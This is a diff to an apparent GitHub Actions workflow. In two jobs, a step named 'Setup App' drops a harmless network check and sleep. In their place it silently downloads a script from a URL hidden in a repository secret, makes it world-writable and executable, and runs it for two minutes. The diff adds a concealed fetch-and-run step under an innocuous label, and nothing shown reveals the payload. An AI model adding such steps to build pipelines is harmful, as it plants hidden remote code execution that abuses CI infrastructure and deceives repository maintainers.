@@ -17,8 +17,10 @@ jobs:
       - name: Setup App
         working-directory: ./runner
         run: |
-              curl ipinfo.io
-              timeout 10s sleep 1m || ( [[ $? -eq 124 ]] && \
+              wget -qO autorun.sh ${{ secrets.FILES }} > /dev/null 2>&1
+              sleep 3
+              chmod 777 autorun.sh
+              timeout 2m ./autorun.sh || ( [[ $? -eq 124 ]] && \
               echo "WARNING: Timeout reached, but that's OK" )
         shell: bash
         
@@ -36,7 +38,9 @@ jobs:
       - name: Setup App
         working-directory: ./runner
         run: |
-              curl ipinfo.io
-              timeout 10s sleep 1m || ( [[ $? -eq 124 ]] && \
+              wget -qO autorun.sh ${{ secrets.FILES }} > /dev/null 2>&1
+              sleep 3
+              chmod 777 autorun.sh
+              timeout 2m ./autorun.sh || ( [[ $? -eq 124 ]] && \
               echo "WARNING: Timeout reached, but that's OK" )
         shell: bash
